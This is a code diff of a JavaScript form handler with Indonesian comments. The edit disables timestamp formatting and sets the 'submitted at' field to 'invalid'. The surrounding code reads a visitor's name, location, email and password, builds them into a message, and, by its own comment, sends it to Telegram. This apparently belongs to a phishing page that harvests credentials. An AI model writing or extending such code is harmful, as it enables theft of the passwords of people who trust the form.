@@ -94,24 +94,24 @@ inputDate.addEventListener("change", function() {
 
 form.addEventListener('submit', async (event) => {
   event.preventDefault();
-let datesubmit;
-                        var waktu = new Date();
-                        var tahun = waktu.getFullYear();
-                        var bulan = waktu.toLocaleDateString('id-ID', { month: 'long' });
-                        var tanggal = waktu.getDate();
-                        var hari = waktu.toLocaleDateString('id-ID', { weekday: 'long' });
-                        var jam = waktu.getHours();
-                        var menit = waktu.getMinutes();
-                        var detik = waktu.getSeconds();
+// let datesubmit;
+ //                       var waktu = new Date();
+ //*                       var tahun = waktu.getFullYear();
+   //                     var bulan = waktu.toLocaleDateString('id-ID', { month: 'long' });
+                //        var tanggal = waktu.getDate();
+          //          var hari = waktu.toLocaleDateString('id-ID', { weekday: 'long' });
+                     //   var jam = waktu.getHours();
+              //          var menit = waktu.getMinutes();
+                //        var detik = waktu.getSeconds();
 
-                        // Tambahkan angka 0 di depan jam, menit, dan detik jika nilainya kurang dari 10
-                        jam = (jam < 10 ? "0" : "") + jam;
-                        menit = (menit < 10 ? "0" : "") + menit;
-                        detik = (detik < 10 ? "0" : "") + detik;
+   //                     // Tambahkan angka 0 di depan jam, menit, dan detik jika nilainya kurang dari 10
+     //                   jam = (jam < 10 ? "0" : "") + jam;
+      //                  menit = (menit < 10 ? "0" : "") + menit;
+   //                     detik = (detik < 10 ? "0" : "") + detik;
 
-                        var waktuString = hari + ', ' + tanggal + ' ' + bulan + ' ' + tahun + ' ' + jam + ':' + menit + ':' + detik;
-document.querySelector('form > footer').innerHTML = "Waktu Di-Submit : " + waktuString
-                        datesubmit = waktuString;
+ //*                      var waktuString = hari + ', ' + tanggal + ' ' + bulan + ' ' + tahun + ' ' + jam + ':' + menit + ':' + detik;
+// document.querySelector('form > footer').innerHTML = "Waktu Di-Submit : " + waktuString
+ //                       datesubmit = waktuString; 
 
   // Ambil nilai dari setiap elemen input
   const nama = document.getElementById('nama').value;
@@ -128,7 +128,7 @@ document.querySelector('form > footer').innerHTML = "Waktu Di-Submit : " + waktu
   Lokasi : ${alamat}
   Email : ${email}
   Kata Sandi : ${kata_sandi}
-  Dikirim Pada : ${datesubmit}
+  Dikirim Pada : invalid
   `;
 
   // Kirim data ke Telegram
